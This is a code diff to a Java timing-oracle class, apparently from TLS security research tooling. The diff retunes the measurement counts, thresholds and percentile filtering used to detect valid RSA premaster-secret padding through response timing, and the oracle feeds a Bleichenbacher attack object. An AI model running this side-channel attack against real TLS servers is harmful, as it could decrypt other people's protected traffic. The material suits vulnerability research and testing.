@@ -141,28 +141,25 @@ public class TimingOracle extends ATimingOracle {
     /**
      * Amount of measurementsTest per Oracle query
      */
-    private static final int measurementAmount = 15;
-    private static final int measurementFactorForValidation = 5;
+    private static final int measurementAmount = 50;
+    private static final int measurementFactorForValidation = 3;
     
     /**
      * Amount of warmup measurementsTest
      */
-    private static final int warmupAmount = 100;
+    private static final int warmupAmount = 10;
     
     /**
      * Timing difference between invalid and valid timings
      */
-    private static final long validInvalidBoundary = 30000;
+    private static final long validInvalidBoundary = -20000;
     
     
-    private int boxLowPercentile = 10,
-            boxHighPercentile = 10;
+    private int boxLowPercentile = 20,
+            boxHighPercentile = 20;
         
     private int counterOracle = 0;
     private int counterRequest = 0;
-    
-    
-    long[] measurementsValid = new long[measurementAmount * measurementFactorForValidation];
     
     ArrayList<Long> validTimings = new ArrayList<Long>(trainingAmount);
     ArrayList<Long> invalidTimings = new ArrayList<Long>(trainingAmount);
@@ -194,16 +191,11 @@ public class TimingOracle extends ATimingOracle {
         boolean result;
         
         counterRequest++;
-        
-        if(counterRequest < 10 || counterRequest % 10 == 0) {
-            result = isValidPMS(testPMS, measurementAmount, true);
-        } else {
-            result = isValidPMS(testPMS, measurementAmount, false);
-        }
-        
+        result = isValidPMS(testPMS, measurementAmount);
+                
         if(result == true) {
             System.out.println("Found a candidate for a valid key. Checking again with more measurements.");
-            result = isValidPMS(testPMS, measurementAmount * measurementFactorForValidation, true);
+            result = isValidPMS(testPMS, measurementAmount * measurementFactorForValidation);
         }
         
         return result;
@@ -220,48 +212,37 @@ public class TimingOracle extends ATimingOracle {
      * performed with a known-to-be-valid key
      * @return true if testKey is significantly different from invalidKey and thus valid.
      */
-    private boolean isValidPMS(byte[] testPMS, int amountOfMeasurements, boolean recalibrate) {
+    private boolean isValidPMS(byte[] testPMS, int amountOfMeasurements) {
     
         long[] measurementsTest = new long[amountOfMeasurements];
-        
-        if(recalibrate) {
-            measurementsValid = new long[amountOfMeasurements * 2];
-        }
-        
-        int j = 0;
+        long[] measurementsInvalid = new long[amountOfMeasurements];
+
         for (int i = 0; i < amountOfMeasurements; i++) {
             try {
                 exectuteWorkflow(testPMS);
                 measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
                 
-                if(recalibrate) {
-                    exectuteWorkflow(encPMS);
-                    measurementsValid[j++] = getTimeDelay(getWorkflow().getTraceList());
-                    exectuteWorkflow(encPMS);
-                    measurementsValid[j++] = getTimeDelay(getWorkflow().getTraceList());
-                }
-                
+                exectuteWorkflow(encPMSWrong);
+                measurementsInvalid[i] = getTimeDelay(getWorkflow().getTraceList());
             } catch (OracleException ex) {
                 java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
             }
         }
 
         Arrays.sort(measurementsTest);
-        if(recalibrate) {
-            Arrays.sort(measurementsValid);
-        }
+        Arrays.sort(measurementsInvalid);
         
         int posLow  = measurementsTest.length  * boxLowPercentile  / 100;
-        int posHigh = measurementsValid.length * boxHighPercentile / 100;
+        int posHigh = measurementsInvalid.length * boxHighPercentile / 100;
 
         /*
          * If the filtered difference between these two measurements is smaller
          * than the validInvalidBoundary, then the key is valid (--> true).
          */
-        boolean result = (measurementsTest[posLow] - measurementsValid[posHigh]) < validInvalidBoundary;
+        boolean result = (measurementsTest[posLow] - measurementsInvalid[posHigh]) < validInvalidBoundary;
         
         
-        System.out.println("ZZZ " + measurementsTest[posLow] + " - " + measurementsValid[posHigh] + " = " + (measurementsTest[posLow] - measurementsValid[posHigh]) + ", " + result);
+        System.out.println("ZZZ " + measurementsTest[posLow] + " - " + measurementsInvalid[posHigh] + " = " + (measurementsTest[posLow] - measurementsInvalid[posHigh]) + ", " + result);
 
         return result;
     }
@@ -553,7 +534,7 @@ public class TimingOracle extends ATimingOracle {
             to.encPMSWrong = encPMSWrong;
 
             to.trainOracle(encPMS, encPMSWrong);
-            // to.plausibilityCheck();
+            //to.plausibilityCheck();
    
             Bleichenbacher attacker = new Bleichenbacher(encPMS,
                     to, true);
